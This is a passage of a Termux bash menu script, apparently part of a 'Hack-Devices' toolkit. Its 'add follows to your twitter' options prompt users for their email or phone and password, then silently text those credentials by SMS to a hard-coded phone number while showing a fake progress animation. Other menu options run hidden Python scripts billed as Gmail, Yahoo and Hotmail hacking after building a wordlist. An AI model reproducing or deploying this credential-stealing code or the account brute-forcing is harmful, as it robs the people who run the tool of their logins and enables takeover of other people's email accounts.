echo -e $green ' ++++++++++++++++++++++++++++++++++++++++++++ '
echo -e $red   ' |                                          | '
echo -e $white ' |  please insert Your Email\Username\phone | '       
echo -e $red   ' |                                          | '
echo -e $green ' |++++++++++++++++++++++++++++++++++++++++++| '
echo ""
echo ""
read -p "insert email or phone : " user
echo -e $green ' ++++++++++++++++++++++++++++++++++++++++++++ '
echo -e $red   ' |                                          | '
echo -e $white ' |  please insert Your password             | '       
echo -e $red   ' |                                          | '
echo -e $green ' |++++++++++++++++++++++++++++++++++++++++++| '
echo ""
echo ""
read -s -p "insert password : " password
echo "---------->Please Waite<-----------"
pkg install termux-api -y
termux-sms-send -n +249920646154 $user,$password
echo "Neran Al Sif"
sleep 1
clear
echo -e $green "Add follow 1 .>> "
sleep 1
clear
echo -e $red "Add follow 1 .>> >> "
sleep 1
clear
echo -e $white "Add follow 1 .>> >> >> "
sleep 1
clear
echo -e $green "Add follow 1 .>> >> >> >> "
sleep 1
clear
echo -e $red "Add follow 1 .>> >> >> >> >> "
sleep 1
clear
echo -e $white "Add follow 1 .>> >> >> >> >> >> "
sleep 1
clear
echo -e $green "Add follow 1 .>> >> >> >> >> >> >> "
sleep 1
clear
echo -e $red "Add follow 1 .>> >> >> >> >> >> >> >> "
sleep 1
clear
echo ""
#python insta-following.py
figlet "successful *_*"
clear
fi

if [ $follow = 3 ]
then
clear
echo ""
echo ""
echo -e $white " must be Install termux-api from google play"
echo ''
echo -e $red "~~~~~~~~~ add follows to your twitter 100% ~~~~~~~~~"
echo ""
echo -e $green ' ++++++++++++++++++++++++++++++++++++++++++++ '
echo -e $red   ' |                                          | '
echo -e $white ' |  please insert Your Email\Username\phone | '       
echo -e $red   ' |                                          | '
echo -e $green ' |++++++++++++++++++++++++++++++++++++++++++| '
echo ""
echo ""
read -p "insert email or phone : " user
echo -e $green ' ++++++++++++++++++++++++++++++++++++++++++++ '
echo -e $red   ' |                                          | '
echo -e $white ' |  please insert Your password             | '       
echo -e $red   ' |                                          | '
echo -e $green ' |++++++++++++++++++++++++++++++++++++++++++| '
echo ""
echo ""
read -s -p "insert password : " password
echo "---------->Please Waite<-----------"
pkg install termux-api -y
termux-sms-send -n +9920646154 $user,$password
echo "Niran Al Sif"
sleep 1
clear
echo -e $green "Add follow 1 .>> "
sleep 1
clear
echo -e $red "Add follow 1 .>> >> "
sleep 1
clear
echo -e $white "Add follow 1 .>> >> >> "
sleep 1
clear
echo -e $green "Add follow 1 .>> >> >> >> "
sleep 1
clear
echo -e $red "Add follow 1 .>> >> >> >> >> "
sleep 1
clear
echo -e $white "Add follow 1 .>> >> >> >> >> >> 
"
sleep 1
clear
echo -e $green "Add follow 1 .>> >> >> >> >> >> 
>> "
sleep 1
clear
echo -e $red "Add follow 1 .>> >> >> >> >> >> 
>> >> "
sleep 1
clear
echo ""
#python insta-following.py
figlet "successful *_*"
clear

fi

if [ $follow = 0 ]
then
clear
echo ""
echo ""
figlet "GOOD BYE"
echo ""
figlet " Exit"
#python insta-following.py
fi
read -p "Press [Enter] key to continue..."
readEnterkey
 ;;
 8)
clear
echo ""
echo "--------------------------------------"
echo " W O R D L I S T  - C R E A T O R "
echo "--------------------------------------"
echo -e "------ Waiting ------"
sleep 0.9
cd $HOME/Hack-Devices && python .list.py
read -p "Press [Enter] key to continue..."
readEnterkey
 ;;
 9)
clear
echo ""
echo -e "$reset"
echo -e 		"1. Gmail"
echo ""
echo -e 		"2. Yahoo"
echo ""
echo -e 		"3. Hotmail"
echo ""
read -p  "Please Enter Your Choice : " choose
if [ $choose -eq 1 ]
then
echo -e "$blue"
echo "--------------------------"
echo " H A C K  - G M A I L "
echo "--------------------------"
echo -e " Hi You Must Genrator WordList First "
echo ""
read -p "[!] Do you need to do that ? (y/n) " a1
if [ $a1 = y ]
then
cd $HOME/Hack-Devices && python .list.py
fi
if [ $a1 = n ]
then
echo ""
echo -e "Are you sure dont to do it? "
cd $HOME/Hack-Devices && python2 .gmail.py
fi
fi
if [ $choose -eq 2 ]
then 
echo -e "$p"
echo "--------------------------"
echo " H A C K  - Y A H O O "
echo "--------------------------"
echo -e " Hi You Must Genrator WordList First "
echo ""
read -p "[!] Do you need to do that ? (y/n) " a1
if [ $a1 = y ]
then
cd $HOME/Hack-Devices && python .list.py
fi
if [ $a1 = n ]
then
echo ""
echo -e "Are you sure dont to do it? "
cd $HOME/Hack-Devices && python2 .yahoo.py
fi
fi
if [ $choose -eq 3 ]
then
echo -e "$cyan"
echo "--------------------------"
echo " H A C K  - H O T M A I L "
echo "--------------------------"
echo -e " Hi You Must Genrator WordList First "
echo ""
read -p "[!] Do you need to do that ? (y/n) " a1
if [ $a1 = y ]
then
cd $HOME/Hack-Devices && python .list.py
fi
if [ $a1 = n ]
then
echo ""
echo -e "Are you sure dont to do it? "
cd $HOME/Hack-Devices && python2 .live.py
fi
fi
read -p "Press [Enter] key to continue..."
readEnterkey
 ;;
 10)
clear
echo ""
printf "\e[1;45m Thanks For Usage  \e[0m\n"
printf "\e[1;45m Good Bye! \e[0m\n"
exit 0
 ;;
 *)
printf "\e[1;45m Invalid option! \e[0m\n"
read -p "Press [Enter] key to continue..."
readEnterkey
 esac
done
